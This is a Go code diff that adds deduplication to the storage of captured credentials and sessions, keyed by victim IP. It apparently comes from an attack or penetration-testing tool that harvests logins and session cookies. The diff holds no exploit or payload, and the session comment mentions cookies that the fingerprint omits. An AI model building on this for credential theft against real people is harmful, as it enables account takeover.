@@ -275,6 +275,14 @@ func (s *Store) Hosts() []*Host {
 func (s *Store) AddCred(c Cred) Cred {
 	s.mu.Lock()
 	defer s.mu.Unlock()
+	// Deduplicate: same service+username+host+victim is the same credential.
+	fp := c.Service + "\x00" + c.Username + "\x00" + c.Host + "\x00" + c.VictimIP
+	for _, existing := range s.creds {
+		efp := existing.Service + "\x00" + existing.Username + "\x00" + existing.Host + "\x00" + existing.VictimIP
+		if fp == efp {
+			return existing
+		}
+	}
 	s.nextCredID++
 	c.ID = s.nextCredID
 	s.creds = append(s.creds, c)
@@ -305,6 +313,14 @@ func (s *Store) CredsBySource(source string) []Cred {
 func (s *Store) AddSession(sess Session) Session {
 	s.mu.Lock()
 	defer s.mu.Unlock()
+	// Deduplicate: same host+victim+cookies is the same session.
+	fp := sess.Host + "\x00" + sess.VictimIP
+	for _, existing := range s.sessions {
+		efp := existing.Host + "\x00" + existing.VictimIP
+		if fp == efp {
+			return existing
+		}
+	}
 	s.nextSessID++
 	sess.ID = s.nextSessID
 	s.sessions = append(s.sessions, sess)
